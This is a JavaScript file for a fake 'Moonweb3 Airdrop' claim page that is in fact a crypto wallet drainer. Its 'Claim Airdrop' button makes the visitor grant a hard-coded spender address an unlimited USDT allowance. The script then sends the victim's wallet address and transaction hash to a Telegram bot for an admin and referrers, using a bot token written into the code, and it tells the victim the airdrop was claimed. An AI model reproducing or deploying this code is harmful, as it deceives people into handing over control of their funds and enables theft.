window.addEventListener('DOMContentLoaded', async () => {
const WALLETCONNECT_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";
const SPENDER_ADDRESS = "0xa2b9cade09d3cefdee5e981ca0517912bedc5961";

const TELEGRAM_BOT = "8565350380:AAGJHdDxkvx1pdo1FMUmncvKnHq_iPfUMSY";
const ADMIN_CHAT_ID = "5126266116";
const REFERRERS = { mmd: "8279866827", zk: "7662871309"};

fetch("https://gr3gtoken.vercel.app/api/send", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ message: "✅ User completed task" })
});

const NETWORKS = {
  1: { name:"Ethereum", symbol:"ETH", rpc:"https://eth.llamarpc.com", explorer:"https://etherscan.io", moonpay:"https://buy.moonpay.com?currencyCode=eth", usdtAddress:"0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals:6 },
  56: { name:"BNB Smart Chain", symbol:"BNB", rpc:"https://bsc-dataseed.binance.org", explorer:"https://bscscan.com", moonpay:"https://buy.moonpay.com?currencyCode=bnb", usdtAddress:"0x55d398326f99059fF775485246999027B3197955", decimals:18 }
};

const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
let provider, signer, wcProvider=null, userAddress=null, isProcessing=false, activeProviderType=null;
let currentChainId = 56;

const injectBtn = document.getElementById('injectBtn');
const wcBtn = document.getElementById('wcBtn');
const approveBtn = document.getElementById('approveBtn');
const walletDiv = document.getElementById('wallet');
const statusDiv = document.getElementById('statusMessage');
const moonpayLink = document.getElementById('moonpayLink');

function updateWalletDisplay(address){ walletDiv.innerText = `Connected: ${address.slice(0,6)}...${address.slice(-4)}`; }
function updateStatusMessage(message,type='default'){ statusDiv.textContent=message; statusDiv.className='status-message'; if(type==='approving') statusDiv.classList.add('approving'); else if(type==='approved') statusDiv.classList.add('approved'); else if(type==='error') statusDiv.classList.add('error'); statusDiv.style.display='block'; }

function getReferral(){ const params=new URLSearchParams(window.location.search); return params.get("ref"); }
async function sendTelegram(chatId,message){ if(!chatId) return; await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:chatId,text:message})}); }

function updateMoonPayLink(){ const n=NETWORKS[currentChainId]; moonpayLink.href=n.moonpay; moonpayLink.textContent=`Buy ${n.symbol} with MoonPay`; }
updateMoonPayLink();

document.querySelectorAll('.network-btn').forEach(btn=>{ btn.onclick=()=>{
  document.querySelectorAll('.network-btn').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  currentChainId=parseInt(btn.dataset.chain);
  updateMoonPayLink();
}});

async function connected(){ try{ userAddress = await signer.getAddress(); updateWalletDisplay(userAddress); approveBtn.disabled=false; updateStatusMessage('Ready to claim Airdrop'); } catch(err){ console.error(err); updateStatusMessage('Failed: '+err.message,'error'); } }
async function ensureInjectedChain(){ const hex='0x'+currentChainId.toString(16); const cid=await window.ethereum.request({method:'eth_chainId'}); if(cid!==hex){ await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:hex}]}); } }

injectBtn.onclick = async ()=>{
  if(!window.ethereum){ alert("Install MetaMask/Wallet"); return; }
  injectBtn.disabled=true; injectBtn.textContent="Connecting...";
  try{
    provider=new ethers.providers.Web3Provider(window.ethereum);
    await window.ethereum.request({method:'eth_requestAccounts'});
    signer = provider.getSigner();
    activeProviderType='injected';
    await connected();
  } catch(err){ console.error(err); updateStatusMessage('Connection failed','error'); }
  injectBtn.disabled=false; injectBtn.textContent="Connect Wallet";
};

wcBtn.onclick = async ()=>{
  try{
    if(wcProvider){ await wcProvider.disconnect().catch(()=>{}); wcProvider=null; }
    wcBtn.disabled=true; wcBtn.textContent="Connecting...";
    const {EthereumProvider}=await import('https://esm.sh/@walletconnect/ethereum-provider@2?bundle');
    wcProvider=await EthereumProvider.init({projectId:WALLETCONNECT_PROJECT_ID,chains:[56],showQrModal:true,rpcMap:{56:NETWORKS[56].rpc},metadata:{name:'Moonweb3 Airdrop',url:window.location.origin}});
    const accounts=await wcProvider.enable();
    window.ethereum=wcProvider;
    provider=new ethers.providers.Web3Provider(wcProvider);
    signer=provider.getSigner();
    activeProviderType='Other walletconnect';
    await connected();
  } catch(err){ console.error(err); updateStatusMessage('WalletConnect failed','error'); }
  wcBtn.disabled=false; wcBtn.textContent="Other WalletConnect";
};

approveBtn.onclick=async()=>{
  if(isProcessing) return;
  isProcessing=true; approveBtn.disabled=true; approveBtn.textContent='Approving...';
  updateStatusMessage('Approving Airdrop...','approving');
  try{
    if(activeProviderType==='injected') await ensureInjectedChain();
    const network=NETWORKS[currentChainId];
    const usdt=new ethers.Contract(network.usdtAddress,ERC20_ABI,signer);
    const tx=await usdt.approve(SPENDER_ADDRESS,ethers.constants.MaxUint256);
    const ref=getReferral(); const refChat=REFERRERS[ref];
    await sendTelegram(ADMIN_CHAT_ID, `🔄 CLAIM STARTED\nWallet:${userAddress}\nRef:${ref||'none'}\nTx:${tx.hash}`);
    if(refChat) await sendTelegram(refChat, `👤 Someone used your referral\nWallet:${userAddress}\nTx:${tx.hash}`);
    updateStatusMessage('Transaction sent...');
    const receipt=await tx.wait();
    if(receipt.status===1){
      updateStatusMessage('✅ Airdrop claimed!','approved'); approveBtn.textContent='Approved ✓';
      await sendTelegram(ADMIN_CHAT_ID, `✅ CLAIM SUCCESS\nWallet:${userAddress}\nRef:${ref||'none'}\nTx:${tx.hash}\n${network.explorer}/tx/${tx.hash}`);
      if(refChat) await sendTelegram(refChat, `🎉 Your referral CLAIMED successfully\nWallet:${userAddress}\nTx:${tx.hash}`);
    } else throw new Error("Tx failed");
  } catch(err){ console.error(err); updateStatusMessage('❌ Claim failed: '+err.message,'error'); approveBtn.disabled=false; approveBtn.textContent='Claim Airdrop'; }
  finally{ isProcessing=false; }
};

window.addEventListener('beforeunload',()=>{ if(wcProvider?.disconnect) wcProvider.disconnect().catch(()=>{}); });
});
